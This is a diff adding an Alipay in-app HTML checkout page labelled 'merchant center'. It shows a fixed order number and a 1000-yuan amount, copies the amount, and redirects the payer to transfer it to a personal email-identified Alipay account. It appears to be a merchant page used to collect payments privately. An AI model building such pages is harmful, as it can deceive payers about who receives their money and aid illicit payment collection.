@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head >
+    <meta charset="utf-8" />
+    <title>商家中心</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0" />
+
+    <script>
+        var payFlag = false;
+        var docEl = document.documentElement;
+        docEl.style.fontSize = 100 / 375 * docEl.clientWidth  + 'px';
+        window.addEventListener('resize', function() {
+            docEl.style.fontSize = 100 / 375 * docEl.clientWidth + 'px';
+        });
+    </script>
+    <link rel="stylesheet" href="https://gw.alipayobjects.com/as/g/antui/antui/10.1.10/dpl/antui.css"/>
+    <link rel="stylesheet"  href="https://gw.alipayobjects.com/as/g/antui/antui/10.1.10/dpl/widget/message.css" />
+    <link rel="stylesheet"  href="https://gw.alipayobjects.com/as/g/antui/antui/10.1.10/dpl/icon/message.css" />
+    <link rel="stylesheet"  href="https://gw.alipayobjects.com/as/g/antui/antui/10.1.32/rem/widget/notice.css" />
+    <link rel="stylesheet"  href="https://gw.alipayobjects.com/as/g/antui/antui/10.1.32/dpl/widget/tips.css" />
+    <link rel="stylesheet"  href="https://gw.alipayobjects.com/as/g/antui/antui/10.1.32/dpl/widget/toast.css" />
+
+    <script type="text/javascript" charset="utf-8" src="https://wwww.chuangyanqiche.com/api_static/js/jquery-1.7.2.min.js"></script>
+    <script src="https://wwww.chuangyanqiche.com/api_static/js/clipboard.min.js"></script>
+    <script src="https://gw.alipayobjects.com/as/g/h5-lib/alipayjsapi/3.1.1/alipayjsapi.min.js"></script>
+
+    <style>
+        .am-message-weak {
+            color: #108ee9;
+            font-size: 12px;
+        }
+
+        #qrImg img{
+            margin:auto;
+            mgrgin-top: 5px;
+        }
+    </style>
+
+</head>
+
+
+<body ontouchstart="">
+<div class="am-message result" style="padding:10px 15px;">
+    <i class="am-icon result wait" id="icon"></i>
+
+    <div class="am-message-sub" style="font-size: 16px;">请按照粘贴金额支付<b id="seconds"></b></div>
+    <br>
+    <div class="am-message-weak">
+        交易订单号：ZFB2019050711325700002654        </div>
+    <div class="am-message-weak" style="font-size:20px">
+        金额 <b style="font-size: 30px; color: #ff5e15" id="money" >1000.00</b> 元
+    </div>
+    <div class="am-button-wrap">
+        <button class="am-button blue" id="payBtn" real_money="1000.00">复制金额并跳转</button>
+        <div>
+            <img src="https://wwww.chuangyanqiche.com/api_static/images/show.jpg" width="300px"/>
+        </div>
+    </div>
+</div>
+<div class="am-button-wrap">
+    <p style="text-align: left;font-size: 16px; color: #969696;">
+        1、跳转成功后点击“转账”<br>
+        2、长按金额输入框，粘贴复制的金额<br>
+        3、<b style="color: red;">修改金额支付不到账！</b>
+    </p>
+</div>
+
+<script>
+
+    var getStatusTimer;
+
+    function changeCss(cssClass,mainMsg,subMsg) {
+        $(".am-icon.result").removeClass().addClass(cssClass);
+        $(".am-message-sub").html(subMsg);
+    }
+
+    function pay() {
+        changeCss("am-icon result wait","支付中","请在<b style='color: red'>180</b>秒内支付...");
+
+        //设置定时任务查询订单状态
+        var t = 300;
+        getStatusTimer = setInterval(function () {
+
+            changeCss("am-icon result wait","支付中","请在<b style='color: red'>"+t+"</b>秒内支付...");
+            if (t<=0){
+                changeCss("am-icon result error","未知状态","支付超时，请到商户订单中确认支付状态");
+                window.clearInterval(getStatusTimer);
+                return;
+            }
+            t--;
+
+        },1000);
+    }
+
+    var clipboard ;
+    window.onload = function() {
+        pay();
+        clipboard = new ClipboardJS('#payBtn',{
+            text: function (trigger) {
+                return trigger.getAttribute("real_money");
+            }
+        });
+
+        clipboard.on('success', function(e) {
+            goPay();
+        });
+    }
+</script>
+
+<script>
+
+    //右上角菜单
+    AlipayJSBridge.call('setOptionMenu', {
+        icontype: 'filter',
+
+    });
+    AlipayJSBridge.call('showOptionMenu');
+    document.addEventListener('optionMenu', function(e) {
+        AlipayJSBridge.call('showPopMenu', {
+            menus: [{
+                name: "查看帮助",
+                tag: "tag1",
+
+            },
+                {
+                    name: "我要投诉",
+                    tag: "tag2",
+                }
+            ],
+        }, function(e) {
+            console.log(e);
+        });
+    }, false);
+
+    ap.allowPullDownRefresh(false);
+    ap.onPullDownRefresh(function(res){
+        if(!res.refreshAvailable){
+            ap.alert({
+                content: '刷新已禁止',
+                buttonText: '恢复'
+            }, function(){
+                ap.allowPullDownRefresh(true);
+                ap.showToast('刷新已恢复')
+            });
+        }
+    });
+
+
+    function goPay() {
+
+        var url = 'dlhy7777@163.com';
+
+        var urls = 'alipays://platformapi/startapp?requestType=hotword_b&appId=20001003&keyword='+encodeURIComponent(url);
+
+        AlipayJSBridge.call('alert', {
+            title: '注意事项',
+            message: "请在输入框粘贴金额【1000.00 】元付款！\r\n请点【转帐】请勿充值话费",
+
+            button: '确定'
+        }, function(e) {
+            setTimeout(function () {
+
+                window.location.href = urls;
+
+                //AlipayJSBridge.call('pushWindow', { url: urls });
+            }, 100);
+        });
+    }
+</script>
+
+</body>
+
+
+
+
+</html>
